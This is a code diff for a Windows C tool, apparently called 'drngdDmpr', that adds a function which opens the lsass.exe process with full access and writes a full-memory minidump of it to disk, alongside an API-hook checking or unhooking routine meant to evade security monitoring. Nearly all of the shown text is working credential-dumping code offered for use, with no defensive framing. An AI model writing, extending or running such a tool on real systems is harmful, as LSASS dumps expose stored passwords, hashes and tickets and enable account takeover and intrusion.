@@ -1,12 +1,16 @@
+#pragma comment (lib, "dbghelp.lib")
+
 #include <windows.h>
 #include <stdio.h>
 #include <Psapi.h>
+#include <TlHelp32.h>
+#include <Dbghelp.h>
 
 #define ok(msg, ...) printf("\033[0;32m[+]\033[0;37m " msg "\n", ##__VA_ARGS__)
 #define info(msg, ...) printf("\033[0;34m[*]\033[0;37m " msg "\n", ##__VA_ARGS__)
 #define warn(msg, ...) printf("\033[0;31m[-]\033[0;37m " msg "\n", ##__VA_ARGS__)
 
-BOOL unhook() {
+BOOL getHooks() {
 	 /*
 		CHECK FOR HOOKS
 	*/
@@ -70,12 +74,55 @@ BOOL unhook() {
 	return TRUE;
 }
 
-int main() {
+BOOL dump(IN DWORD LsassPID) {
+	HANDLE hLsass = NULL;
+
+	// create handle on outfile
+	HANDLE hOutFile = CreateFile("drngdDmpr.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	ok("created handle for outfile");
+	info("handle 0x%p", hOutFile);
+
+	// get the lsass PID
+	hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPID);
+	if (hLsass == NULL) {
+		warn("failed to open handle on lsass");
+	}
+	ok("got handle on lsass (%ld)", LsassPID);
+	info("handle: 0x%p", hLsass);
+
+	// create a dump of lsass
+	BOOL bIsDumped = MiniDumpWriteDump(hLsass, LsassPID, hOutFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+	if (bIsDumped) {
+		ok("successfully dumped lsass to drngdDmpr.dmp");
+	} else {
+		warn("failed to dump lsass");
+		CloseHandle(hLsass);
+		CloseHandle(hOutFile);
+
+		return FALSE;
+	}
+
+	CloseHandle(hLsass);
+	CloseHandle(hOutFile);
+
+	return TRUE;
+}
+
+int main(int argc, char *argv[]) {
+	if (argc != 2) {
+		warn("usage: drngdDmpr.exe <lsass.exe pid>");
+	}
+	
+	DWORD dwLsassPID = NULL;
+	dwLsassPID = atoi(argv[1]);
+
 	// unhook api hooks
-	BOOL bIsUnhooked = unhook();
+	BOOL bIsUnhooked = getHooks();
 	if (bIsUnhooked != TRUE) {
 		warn("dont know how this shit broke");
 	}
+
+	BOOL bIsDumped = dump(dwLsassPID);
 
     return EXIT_SUCCESS;
 }
